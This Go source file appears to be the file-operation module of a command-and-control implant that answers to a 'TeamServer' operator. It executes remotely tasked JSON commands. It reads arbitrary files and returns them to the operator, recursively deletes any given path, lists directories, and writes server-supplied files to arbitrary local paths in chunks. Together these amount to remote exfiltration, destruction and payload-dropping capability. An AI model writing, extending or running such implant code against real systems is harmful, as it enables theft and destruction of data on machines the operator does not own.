package command

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"time"
)

// CommandIDFile File 操作命令 ID
const CommandIDFile uint32 = 10

// FileOpArgs 文件操作参数
type FileOpArgs struct {
	Action      string `json:"action"`      // list, rm, upload, download
	Path        string `json:"path"`        // For list, rm, upload
	Source      string `json:"source"`      // For download (server path)
	Destination string `json:"destination"` // For download (local path)
	FileSize    int64  `json:"file_size"`   // For download
	ChunkSize   int    `json:"chunk_size"`  // For download
}

// FileInfo 文件信息结构
type FileInfo struct {
	Name        string `json:"name"`
	IsDir       bool   `json:"is_dir"`
	Size        int64  `json:"size"`
	LastModTime string `json:"last_mod_time"`
}

// ChunkDownloader 块下载器接口，由 main.go 注入实现
type ChunkDownloader interface {
	DownloadChunk(taskID string, chunkNumber int64) ([]byte, error)
}

// 全局块下载器，需要在 main.go 中注入
var chunkDownloader ChunkDownloader

// SetChunkDownloader 设置块下载器
func SetChunkDownloader(downloader ChunkDownloader) {
	chunkDownloader = downloader
}

// FileCommand 实现文件操作命令
type FileCommand struct{}

func init() {
	Register(&FileCommand{})
}

func (c *FileCommand) ID() uint32 {
	return CommandIDFile
}

func (c *FileCommand) Name() string {
	return "file"
}

func (c *FileCommand) Execute(task *Task) ([]byte, error) {
	var args FileOpArgs
	if err := json.Unmarshal(task.Arguments, &args); err != nil {
		return nil, fmt.Errorf("failed to parse file operation arguments: %v", err)
	}

	switch args.Action {
	case "upload": // Agent reads local file (Operator Download)
		return handleUpload(args.Path)
	case "download": // Agent writes to local file (Operator Upload)
		err := handleDownload(task.TaskID, args)
		// 返回 JSON 格式结果，TeamServer 期望解析
		result := map[string]interface{}{
			"destination": args.Destination,
			"file_size":   args.FileSize,
			"success":     err == nil,
		}
		if err != nil {
			result["error"] = err.Error()
		}
		return json.Marshal(result)
	case "list":
		return handleBrowse(args.Path)
	case "rm":
		return handleRm(args.Path)
	default:
		return nil, fmt.Errorf("unknown file operation: %s", args.Action)
	}
}

func handleUpload(path string) ([]byte, error) {
	log.Printf("Reading file from %s to upload", path)
	return os.ReadFile(path)
}

func handleRm(path string) ([]byte, error) {
	log.Printf("Removing file/directory: %s", path)
	err := os.RemoveAll(path)
	if err != nil {
		return nil, err
	}
	return []byte(fmt.Sprintf("Successfully removed: %s", path)), nil
}

func handleBrowse(dirPath string) ([]byte, error) {
	log.Printf("Browsing directory: %s", dirPath)

	absoluteDirPath, err := filepath.Abs(dirPath)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve absolute path for %s: %v", dirPath, err)
	}

	entries, err := os.ReadDir(absoluteDirPath)
	if err != nil {
		log.Printf("Error reading directory %s: %v", absoluteDirPath, err)
		jsonOutput, _ := json.Marshal([]FileInfo{})
		return []byte(absoluteDirPath + "\n" + string(jsonOutput)), nil
	}

	files := make([]FileInfo, 0)
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			log.Printf("Warning: failed to get info for %s: %v", entry.Name(), err)
			continue
		}
		files = append(files, FileInfo{
			Name:        info.Name(),
			IsDir:       info.IsDir(),
			Size:        info.Size(),
			LastModTime: info.ModTime().Format(time.RFC3339),
		})
	}

	jsonOutput, err := json.Marshal(files)
	if err != nil {
		log.Printf("Error marshaling file info to JSON for %s: %v", dirPath, err)
		jsonOutput = []byte("[]")
	}

	return []byte(absoluteDirPath + "\n" + string(jsonOutput)), nil
}

func handleDownload(taskID string, args FileOpArgs) error {
	if chunkDownloader == nil {
		return fmt.Errorf("chunk downloader not initialized")
	}

	if args.ChunkSize == 0 {
		return fmt.Errorf("chunk size cannot be zero")
	}

	// Create temporary file
	tempFilePath := args.Destination + ".tmp"
	destFile, err := os.Create(tempFilePath)
	if err != nil {
		return fmt.Errorf("could not create temporary file %s: %v", tempFilePath, err)
	}
	// 注意：不使用 defer，因为需要在重命名前显式关闭文件

	// Calculate total chunks and loop
	totalChunks := (args.FileSize + int64(args.ChunkSize) - 1) / int64(args.ChunkSize)
	log.Printf("Starting download of %s to %s. Total size: %d bytes, Chunks: %d",
		args.Source, args.Destination, args.FileSize, totalChunks)

	for i := int64(0); i < totalChunks; i++ {
		chunkData, err := chunkDownloader.DownloadChunk(taskID, i)
		if err != nil {
			destFile.Close()
			os.Remove(tempFilePath)
			return fmt.Errorf("failed to download chunk %d: %v", i, err)
		}

		if _, err := destFile.Write(chunkData); err != nil {
			destFile.Close()
			os.Remove(tempFilePath)
			return fmt.Errorf("failed to write chunk %d to temporary file: %v", i, err)
		}
		log.Printf("Downloaded and wrote chunk %d/%d", i+1, totalChunks)
	}

	// 关闭文件后再重命名（特别是 Windows 需要先关闭文件句柄）
	if err := destFile.Close(); err != nil {
		os.Remove(tempFilePath)
		return fmt.Errorf("failed to close temporary file: %v", err)
	}

	// Rename file
	if err := os.Rename(tempFilePath, args.Destination); err != nil {
		os.Remove(tempFilePath)
		return fmt.Errorf("failed to rename temporary file to %s: %v", args.Destination, err)
	}

	log.Printf("Successfully downloaded file to %s", args.Destination)
	return nil
}
